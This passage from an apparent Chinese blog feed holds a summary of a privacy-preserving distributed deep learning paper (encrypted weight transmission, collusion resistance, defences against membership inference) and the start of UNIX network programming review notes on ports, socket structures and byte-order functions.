f(x_t)$需要是一个精确的导数，所以需要进行很多次迭代的运算才能得到结果</li><li>该方法无法逃离鞍点和局部最优点这种导数为0但是不是最小值的点。</li></ol><p>因此我们引入了SGD算法，该算法为随机最速下降算法-Stochastic Gradient Descent。他的主要思想是利用包含噪声的具有随机性的导数使得下降过程不经过鞍点和局部最优点。其中随机导数仅要求期望为单数即可，数学表达为  。该方法的全部数学表达为：<br>$$<br>G_t = \frac{\delta J(W_{t-1},X_t,Y_t)}{\delta W} \\<br>W_t = W_{t-1} - \alpha(t)·G_t<br>$$<br>其中 J 函数为cost function，即对结果优良性的衡量函数，W为权值参数，是每一个属性对结果的权重影响。$\alpha_t$为步长,$G_t$为随机导数。相比于GD，SGD有以下的优良特性：</p><ol><li>导数可以包含噪声，所以算得很快，且大量的理论工作说明，只要噪声不离谱，其实（至少在f是凸函数的情况下），SGD都能够很好地收敛。</li><li>它能够自动逃离鞍点，自动逃离比较差的局部最优点。</li><li>最后找到的答案还具有很强的一般性（generalization），即能够在自己之前没有见过但是服从同样分布的数据集上表现非常好。</li></ol><p>这些优良的性质使得SGD成为深度学习领域较为普遍且优良的算法 ，这也是本文选择这个算法的原因之一。</p><p>本文还有其他有关隐私保护<code>Privacy-preserving</code>的背景知识为：</p><h4 id="Honest-but-Curious"><a href="#Honest-but-Curious" class="headerlink" title="Honest-but-Curious"></a>Honest-but-Curious</h4><p>首先本文假定server是诚实但好奇的(honest-but-curious)，该模型又被称为半诚实模型(semi-Honest model)，其中</p><ul><li>诚实意为结点会诚实的将他的工作全部完成，</li><li>好奇意味着结点在执行过程中会将他所有的数据全部保存下来并在后续时利用他们进行推测攻击。</li></ul><h4 id="Collusion"><a href="#Collusion" class="headerlink" title="Collusion"></a>Collusion</h4><p>相关的，本文假定的攻击还有，trainer和server将会是一伙的，他们之间可以进行共谋(collusion)来对数据进行攻击。</p><h3 id="论文的主要贡献"><a href="#论文的主要贡献" class="headerlink" title="论文的主要贡献"></a>论文的主要贡献</h3><ol><li>舍弃了传统梯度传输的方法而选用权值传输来大幅提高安全性。</li><li>本文使用的方法适用于深度学习适用的所有激活函数，这意味着不会适用近似算法。</li><li>本文通过严格的理论证明诚实但好奇的server和极端共谋，即只有一个trainer可信的情况下，本文的方法依然有极高的安全性。</li><li>通过一个证明表达了本文在准确性方面和将所有数据集集成在一个训练者训练的结果准确性是相同的。</li></ol><h2 id="论文主要内容"><a href="#论文主要内容" class="headerlink" title="论文主要内容"></a>论文主要内容</h2><h3 id="权值传输"><a href="#权值传输" class="headerlink" title="权值传输"></a>权值传输</h3><p>首先，我们要为大家解释一下为什么权值传输相比梯度传输拥有更高的安全性和保护隐私性，本篇文章通过跟之前两篇文章的比较来说明。</p><p>第一篇的主要思想是只传输随机选择的部分梯度而放弃传统的加密方法，尽管在Sec.7 中文章作者又利用了差分隐私增加拉普拉斯噪声的方法，但是数据保密性和差分隐私是正交的，所以仍可能造成泄露。</p><blockquote><p>R. Shokri and V. Shmatikov, “Privacy-preserving deep learning,” in Proc. 22nd ACM SIGSAC Conf. Comput. Commun. Secur., I. Ray, N. Li, and C. Kruegel, Eds., Oct. 2015, pp. 1310–1321.</p></blockquote><p>第二篇文章主要是使用同态加密的方法，虽然进行了加密，但是在共谋的情况下，坏人对其进行解密并得到原始梯度，仍然会对数据造成泄露。所以梯度传输的方法总归会造成数据的泄露，我们选择权值传输的方法来避免这种泄露。这样做的具体原因我们会在theorem2 中进行讲解</p><blockquote><p>L. T. Phong, Y. Aono, T. Hayashi, L. Wang, and S. Moriai, “Privacypreserving deep learning via additively homomorphic encryption,” IEEE Trans. Inf. Forensics Security, vol. 13, no. 5, pp. 1333–1345, May 2018.</p></blockquote><h3 id="SNT-amp-FNT"><a href="#SNT-amp-FNT" class="headerlink" title="SNT &amp; FNT"></a>SNT &amp; FNT</h3><p>本文提供了两种系统SNT，FNT其中大部分内容我们在SNT内就讲到所以我们会详细介绍SNT，并之后简要涉及FNT。我们首先明确在分布式学习过程中，每次进行一个大的循环即每个trainer都进行一次，包含对于每一个trainer的小循环。其中每个符号的意义及说明如下，</p><ol><li> server端是Honest-but-curious 的。</li><li>Dataseti 指代每个人能掌握的数据集。</li><li>（X,Y）是Dataset的子集，且根据分布不同可以是整个数据集或者随机选择的一部分。</li><li>K是trainer 间共享的密钥，但是不能告诉 server –FNT 就不需要了。</li><li>$Enc_k(W)$是用k密钥对W进行加密。</li><li>encW 是加密后的密文。</li><li> $Dec_k(C)$是用K密钥对C进行解密。</li><li>$W_0$是随机选择的初始权重。其中除K以外的所有变量都是vector形式出现的。</li></ol><p>每个trainer执行的操作如下:<br>$$<br>W_1=Dec_k(encW_1) \\<br>G_2 = \frac{\delta J(W_1,X_2,Y_2)}{\delta W} \\<br>W_2 = W_1 - \alpha(t)·G_2 \\<br>encW_2 = Enc_k(W_2)<br>$$<br>​      </p><p>然后将encW传给server，并由server端发送给下一个trainer。</p><img src="/2021/03/20/Transmission/snt.png" class="" title="snt"><p>  *<em>FNT</em>***系统是全连接的,这就产生了一个问题，经过我们对于SNT的描述来看，我们可以以固定的顺序进行训练，那我们为什么需要全连接，增加这么多的路径呢，原因有以下三点：</p><ol><li>如果路径失效，那么系统可能会因此坏掉，所以全连接会增加可靠性。</li><li>全连接的方法可以适应随机发送的工作模式，而不用只能按顺序发送。</li><li>可以实现匿名传输的安全措施，这个我们接下来会讲。</li></ol><img src="/2021/03/20/Transmission/fnt.png" class="" title="fnt"><h3 id="安全-及-准确性-理论解释"><a href="#安全-及-准确性-理论解释" class="headerlink" title="安全 及 准确性 理论解释"></a>安全 及 准确性 理论解释</h3><h4 id="理论一：系统在面对诚实但好奇的服务端下的安全"><a href="#理论一：系统在面对诚实但好奇的服务端下的安全" class="headerlink" title="理论一：系统在面对诚实但好奇的服务端下的安全"></a>理论一：系统在面对诚实但好奇的服务端下的安全</h4><p>我们使用对称加密方法使server端只能看见加密后的W权重，我们选用能抵抗选择的对称加密方法即可。</p><h4 id="理论二：在面对极端共谋collusion下的安全性"><a href="#理论二：在面对极端共谋collusion下的安全性" class="headerlink" title="理论二：在面对极端共谋collusion下的安全性"></a>理论二：在面对极端共谋collusion下的安全性</h4><p>极端共谋即当只有trainer1可信，trainer2-l,server都不可信的情况下,坏人也不能计算出trainer1的数据集信息，除非他们解决非线性问题或子集和问题</p><p>其中<strong>非线性问题</strong>代表我们在进行计算时，我们选择的激活函数都是非线性函数，如果我们想要从计算出来的权值恢复数据集的本身数据，那么我们就需要解决非线性问题，而这种问题是十分难解的</p><p>子集和问题的讲解我们需要借助一些数学公式，首先我们明确的是，在每个训练者经历的一次小循环中，他需要执行有多个公式组成的(1)号式子，并通过化简得到到（2）号式子，因为我们假定前后trainer知道初始的W和结束后的W，那么他未知的就是计算后的(3)号式子。<br>$$<br>G_1 = \frac{\delta J(W_{0},X_1,Y_1)}{\delta W} \\<br>W_1 = W_{0} - \alpha(1)·G_1 \\<br>\vdots \\<br>G_i = \frac{\delta J(W_{i-1},X_i,Y_i)}{\delta W} \\<br>W_i = W_{i-1} - \alpha(i)·G_i \\<br>\vdots \\<br>G_n = \frac{\delta J(W_{n-1},X_n,Y_n)}{\delta W} \\<br>W_n = W_{n-1} - \alpha(n)·G_n     (1)<br>$$</p><p>$$<br>W^{(final)} = W_n \\<br>= W_n-1 - \alpha_nG_n \\<br>= W_n-2 - \alpha_{n-1}G_{n-1} - \alpha_nG_n \\<br>\vdots \\<br>= w_0 - (\alpha_{1}G_{1} + \dots + \alpha_nG_n) \\<br>= W^{(init)} - (\alpha_{1}G_{1} + \dots + \alpha_nG_n) (2) \\<br>W^{(init)} - W^{(final)} = (\alpha_{1}G_{1} + \dots + \alpha_nG_n) (3)<br>$$</p><p>其中符号的定义如下</p><ul><li><p> (𝑋_𝑖,𝑌_𝑖) (1≤𝑖≤𝑛)是Dataset1洗牌后的一小部分</p></li><li><p> 𝛼_𝑖<em>可以是相同的，也可以是trainer1自己选择的</em></p></li><li><p> 𝑛 = |𝐷𝑎𝑡𝑎𝑠𝑒𝑡1|/𝑏𝑎𝑡𝑐ℎ_𝑠𝑖𝑧𝑒≫1</p></li></ul><p>我们看到，我们已知（3）式的和，且n是十分大的。算得每个值是一个NP-Complete难解问题，需要多项式未知的时间复杂度。所以他是安全的。</p><h4 id="定理三：分布式的数据集的运算与在一个主机上对所有数据集的并集进行运算得到的结果是相同的。"><a href="#定理三：分布式的数据集的运算与在一个主机上对所有数据集的并集进行运算得到的结果是相同的。" class="headerlink" title="定理三：分布式的数据集的运算与在一个主机上对所有数据集的并集进行运算得到的结果是相同的。"></a>定理三：分布式的数据集的运算与在一个主机上对所有数据集的并集进行运算得到的结果是相同的。</h4><p>  该定理在逻辑上理解就可以，文中也只给了描述性的证明</p><img src="/2021/03/20/Transmission/fig3.jpg" class="" title="fig3"><hr><h3 id="附加考虑-additional-consideration"><a href="#附加考虑-additional-consideration" class="headerlink" title="附加考虑 additional consideration"></a>附加考虑 additional consideration</h3><p>在该系统运用和实验实际执行的过程中，文中也增加了很多其他非主体系统涉及的方法。</p><h4 id="为了证明子集和问题的实验数据"><a href="#为了证明子集和问题的实验数据" class="headerlink" title="为了证明子集和问题的实验数据"></a>为了证明子集和问题的实验数据</h4><p>在实际数据集中，未知数的数量是远大于等式的数量的，具体的实验情况见下图</p><img src="/2021/03/20/Transmission/table3.jpg" class="" title="table3"><h4 id="为了增加数据集的训练效果，我们会对数据集进行扩张"><a href="#为了增加数据集的训练效果，我们会对数据集进行扩张" class="headerlink" title="为了增加数据集的训练效果，我们会对数据集进行扩张"></a>为了增加数据集的训练效果，我们会对数据集进行扩张</h4><p>例如图片：利用旋转，裁剪，翻转等方法 , 过拟合后面会解决</p><h4 id="实际训练中使用了SGD的进化版本"><a href="#实际训练中使用了SGD的进化版本" class="headerlink" title="实际训练中使用了SGD的进化版本"></a>实际训练中使用了SGD的进化版本</h4><p>例如 ：RMSProp [27] or Adam [28],</p><hr><h3 id="预定义-additional-hedge"><a href="#预定义-additional-hedge" class="headerlink" title="预定义 additional hedge"></a>预定义 additional hedge</h3><p>同时为了使系统更好的进行，我们还进行了一些预定义。首先我们需要明确想要达到完美的，没有泄露的系统是不可能的。文中将其描述为Dalenius desideratum，即系统将会转化为完全的随机数传输，这是没有丝毫实用性的。</p><h4 id="增加了差分隐私即添加噪声的方法"><a href="#增加了差分隐私即添加噪声的方法" class="headerlink" title="增加了差分隐私即添加噪声的方法"></a>增加了差分隐私即添加噪声的方法</h4><p>用于增加隐私性,其实就是在隐私性和准确性之间寻找一种平衡</p><h4 id="利用Dropout-的方法增加差分隐私和防止过拟合"><a href="#利用Dropout-的方法增加差分隐私和防止过拟合" class="headerlink" title="利用Dropout 的方法增加差分隐私和防止过拟合"></a>利用Dropout 的方法增加差分隐私和防止过拟合</h4><p>Dropout 的方法由神经网络领域大牛Hinton 14年提出，主要做法是在训练时随机隐藏一些结点，这样能降低结点间的依赖性，同时也会降低对于数据的依赖性。</p><p><strong>举例</strong>来说，我们将一支军队分为三部分分别在海陆空进行训练，那么他们最后组合起来环境对于他们影响会很小，同时我们也没有办法根据不同环境他们的作战表现判断他们是海军，陆军还是空军。</p><h4 id="使用匿名传输的方法增强隐私性"><a href="#使用匿名传输的方法增强隐私性" class="headerlink" title="使用匿名传输的方法增强隐私性"></a>使用匿名传输的方法增强隐私性</h4><p>我们使用的具体方法为，在由server转发时隐藏数据的来源，或者随机传输，即一个数据可能来自小集合中的任一元素</p><h4 id="赋予每个结点当发现问题就进行防御性进攻的权力（即1，2，3）"><a href="#赋予每个结点当发现问题就进行防御性进攻的权力（即1，2，3）" class="headerlink" title="赋予每个结点当发现问题就进行防御性进攻的权力（即1，2，3）"></a>赋予每个结点当发现问题就进行防御性进攻的权力（即1，2，3）</h4><h4 id="实际攻击举例"><a href="#实际攻击举例" class="headerlink" title="实际攻击举例"></a>实际攻击举例</h4><p>文中还用实际的攻击进行举例，该攻击的目的是通过获取的信息找到模型上一跳在哪个数据集训练的。</p><p>首先，我们当然可以利用1，2，4的方法综合起来，防止这种攻击。当面临一个更强的具体的攻击时，比如成员推理攻击，我们这样防范。</p><p>成员推理攻击的<strong>目的</strong>是：给出一条样本，可以推断该样本是否在模型的训练数据集中——即便对模型的参数、结构知之甚少，该攻击仍然有效</p><p><strong>本质</strong>是：构建一个二分类模型，以X,Y为参数，判断该项是否在数据集中</p><p><strong>主要部分</strong>是：利用影子模型(shadow model)构建与原目标模型训练集相似的数据集</p><p>文中给出了三种构建影子模型的方法：</p><p><strong>Model-based synthesis：</strong> 直观上，如果目标模型以很高的概率给出了某条record的类别，那么该record与目标模型训练集中的数据应该是十分相似的。所以，可以用目标模型本身来构建影子模型的训练数据：</p><ul><li> 我们通过差分隐私添加噪声的方法使概率处于变化中，挑战他的阈值</li></ul><p><strong>Statistics-based synthesis：</strong> 攻击者知道目标模型训练数据的分布信息，比如feature的边缘分布，那么可以直接由分布生成数据。</p><p><strong>Noisy real data：</strong> 攻击者也许可以获得和目标模型训练集数据相似的数据，可以认为是目标模型训练集的噪声版本，直接利用之</p><ul><li>对于二和三方法，由于本文的数据集只会在本地被训练，所以攻击者既不能得到分布也不能得到带噪声的数据，因此可以防范这种攻击。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本片文章亮点主要就是<strong>权值传输</strong>，并且真的是灵活利用了这个内容，我觉得它主要做到了两件事</p><ul><li>首先它让每一个结点在一次循环里执行多次运算，这样就成功引入了<strong>子集和问题</strong>，相当于对于梯度的加密也是对于数据的二次加密</li><li>利用了权值的递归性，这样可以对权值进行加密，下一个trainer再进行解密后计算，中间的转发者不需要知道<strong>密钥</strong>也不需要知道内容，这可能也是一种<strong>端到端</strong>吧</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> privacy-preserving </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX 高级网络编程复习</title>
      <link href="/2021/03/13/UNIX%20%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/03/13/UNIX%20%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本文主要是 UNIX高级网络编程 - 卷一 的总结</p><a id="more"></a><h1 id="UNIX-高级网络编程复习"><a href="#UNIX-高级网络编程复习" class="headerlink" title="UNIX 高级网络编程复习"></a>UNIX 高级网络编程复习</h1><h3 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h3><ol><li>考著名的人物： <ol><li>c语言作者 ， unix 作者： Ken Thompson (Dennis M. Ritchie)， </li><li>GNU 创建者/Emacs 作者 Richard Matthew Stallman ； </li><li>linux 作者：Linus Benedict Torvalds</li><li>vim 作者： Bram Moolenaar</li><li>Tex 作者： Donald Knuth 高德纳</li></ol></li></ol><h3 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h3><p>​    TCP  状态转换图 ， 2.9 常用的Port Number ，2.10 Concurrent Server ， 2.12 services</p><pre class="line-numbers language-none"><code class="language-none">21端口：FTP 文件传输服务22端口：SSH 端口23端口：TELNET 终端仿真服务25端口：SMTP 简单邮件传输服务53端口：DNS 域名解析服务80端口：HTTP 超文本传输服务110端口：POP3 “邮局协议版本3”使用的端口443端口：HTTPS 加密的超文本传输服务**********************************1433端口：MS SQL*SERVER数据库 默认端口号1521端口：Oracle数据库服务1863端口：MSN Messenger的文件传输功能所使用的端口3306端口：MYSQL 默认端口号3389端口：Microsoft RDP 微软远程桌面使用的端口5631端口：Symantec pcAnywhere 远程控制数据传输时使用的端口5632端口：Symantec pcAnywhere 主控端扫描被控端时使用的端口5000端口：MS SQL Server使用的端口8000端口：腾讯QQ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Chapter-3，4，5，6"><a href="#Chapter-3，4，5，6" class="headerlink" title="Chapter 3，4，5，6"></a>Chapter 3，4，5，6</h3><h4 id="Socket-Address-Structures"><a href="#Socket-Address-Structures" class="headerlink" title="Socket Address Structures"></a>Socket Address Structures</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">in_addr</span> <span class="token punctuation">&#123;</span><span class="token class-name">in_addr_t</span> s_addr<span class="token punctuation">;</span> <span class="token comment">/* 32-bit IPv4 address */</span>  <span class="token comment">/* network byte ordered */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> <span class="token punctuation">&#123;</span><span class="token class-name">uint8_t</span> sin_len<span class="token punctuation">;</span> <span class="token comment">/* length of structure (16) */</span><span class="token class-name">sa_family_t</span> sin_family<span class="token punctuation">;</span> <span class="token comment">/* AF_INET */</span><span class="token class-name">in_port_t</span>sin_port<span class="token punctuation">;</span> <span class="token comment">/* 16-bit TCP or UDP port number */</span><span class="token comment">/* network byte ordered */</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span>  sin_addr<span class="token punctuation">;</span> <span class="token comment">/* 32-bit IPv4 address */</span><span class="token comment">/* network byte ordered */</span><span class="token keyword">char</span> sin_zero<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/* unused */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// IPV4</span>inet_addr inet_ntoa<span class="token comment">// IPV4/6</span>inet_pton inet_ntop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>in_addr</code> 是结构的原因是早期将其定义为 <code>union</code> 方便<code>A，B，C</code>类地址的访问</li><li><code>sin_zero</code> 置0</li></ul><h4 id="Generic-socket-address-structure"><a href="#Generic-socket-address-structure" class="headerlink" title="Generic socket address structure"></a>Generic socket address structure</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token punctuation">&#123;</span><span class="token class-name">uint8_t</span> sa_len<span class="token punctuation">;</span><span class="token class-name">sa_family_t</span> sa_family<span class="token punctuation">;</span>  <span class="token comment">/* address family: AF_xxx value */</span><span class="token keyword">char</span> sa_data<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* protocol-specific address */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 用法</span><span class="token keyword">int</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">socklen_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> serv<span class="token punctuation">;</span> <span class="token comment">/* IPv4 socket address structure */</span><span class="token comment">/* fill in serv&#123;&#125; */</span><span class="token function">bind</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>serv<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用于定义函数时适配各种不同类型的地址结构，</p><p>若不转换，编译器报 <code>warning: passing arg 2 of &#39;bind&#39; from incompatible pointer type</code></p><h4 id="Sockaddr-in6"><a href="#Sockaddr-in6" class="headerlink" title="Sockaddr_in6"></a>Sockaddr_in6</h4><p>128-bits ipv6 地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">in6_addr</span> <span class="token punctuation">&#123;</span><span class="token class-name">uint8_t</span> s6_addr<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* 128-bit IPv6 address */</span> <span class="token comment">/* network byte ordered */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIN6_LEN</span>  <span class="token comment">/* required for compile-time tests */</span></span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in6</span> <span class="token punctuation">&#123;</span><span class="token class-name">uint8_t</span> sin6_len<span class="token punctuation">;</span> <span class="token comment">/* length of this struct (28) */</span><span class="token class-name">sa_family_t</span> sin6_family<span class="token punctuation">;</span> <span class="token comment">/* AF_INET6 */</span><span class="token class-name">in_port_t</span> sin6_port<span class="token punctuation">;</span> <span class="token comment">/* transport layer port# */</span><span class="token comment">/* network byte ordered */</span><span class="token class-name">uint32_t</span> sin6_flowinfo<span class="token punctuation">;</span>  <span class="token comment">/* flow information, undefined */</span><span class="token keyword">struct</span> <span class="token class-name">in6_addr</span> sin6_addr<span class="token punctuation">;</span> <span class="token comment">/* IPv6 address */</span><span class="token comment">/* network byte ordered */</span><span class="token class-name">uint32_t</span> sin6_scope_id<span class="token punctuation">;</span>  <span class="token comment">/* set of interfaces for a scope */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Value-Result"><a href="#Value-Result" class="headerlink" title="Value-Result"></a>Value-Result</h4><p>当我们把 SA* 从用户进程传入内核时长度作为值 value ，内核处理完返回时结构的大小可能会改变，因此长度作为一个结果 result 传回 , 引用是因为需要函数内部去赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 用户进程 => 内核</span><span class="token comment">// bind connect sendto </span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> serv<span class="token punctuation">;</span><span class="token comment">/* fill in serv&#123;&#125; */</span><span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span>SA <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>serv<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 内核 => 用户进程</span><span class="token comment">// accept recvfrom getsockname getpeername </span><span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> cli<span class="token punctuation">;</span> <span class="token comment">/* Unix domain */</span><span class="token class-name">socklen_t</span> len<span class="token punctuation">;</span>len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cli<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* len is a value */</span><span class="token function">getpeername</span><span class="token punctuation">(</span>unixfd<span class="token punctuation">,</span> <span class="token punctuation">(</span>SA <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>cli<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* len may have changed */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="字节序-Byte-Ordering"><a href="#字节序-Byte-Ordering" class="headerlink" title="字节序 Byte Ordering"></a>字节序 Byte Ordering</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 字节序转换函数</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token class-name">uint16_t</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> host16bitvalue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint32_t</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> host32bitvalue<span class="token punctuation">)</span><span class="token punctuation">;</span> Both <span class="token keyword">return</span><span class="token operator">:</span> value in network byte order<span class="token class-name">uint16_t</span> <span class="token function">ntohs</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> net16bitvalue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint32_t</span> <span class="token function">ntohl</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> net32bitvalue<span class="token punctuation">)</span><span class="token punctuation">;</span>Both <span class="token keyword">return</span><span class="token operator">:</span> value in host byte order<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>n - network ,  h  - host ,  s - short 16 位, l - long 32 位</p><h4 id="Byte-Manipulation"><a href="#Byte-Manipulation" class="headerlink" title="Byte Manipulation"></a>Byte Manipulation</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;strings.h></span></span><span class="token keyword">void</span> <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bcopy</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span>  <span class="token function">bcmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> equal<span class="token punctuation">,</span> nonzero <span class="token keyword">if</span> unequal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mem</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span>   <span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> equal<span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token number">0</span> or <span class="token operator">></span><span class="token number">0</span> <span class="token keyword">if</span> <span class="token function">unequal</span> <span class="token punctuation">(</span>see text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="地址转换函数"><a href="#地址转换函数" class="headerlink" title="地址转换函数"></a>地址转换函数</h4><p><strong>IPV4</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token comment">// converts the C character string pointed to by strptr into</span><span class="token comment">// its 32-bit binary network byte ordered value, </span><span class="token comment">// which is stored through the pointer addrptr </span><span class="token keyword">int</span> <span class="token function">inet_aton</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strptr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">in_addr</span> <span class="token operator">*</span>addrptr<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">1</span> <span class="token keyword">if</span> string was valid<span class="token punctuation">,</span> <span class="token number">0</span> on error<span class="token class-name">in_addr_t</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strptr<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">32</span><span 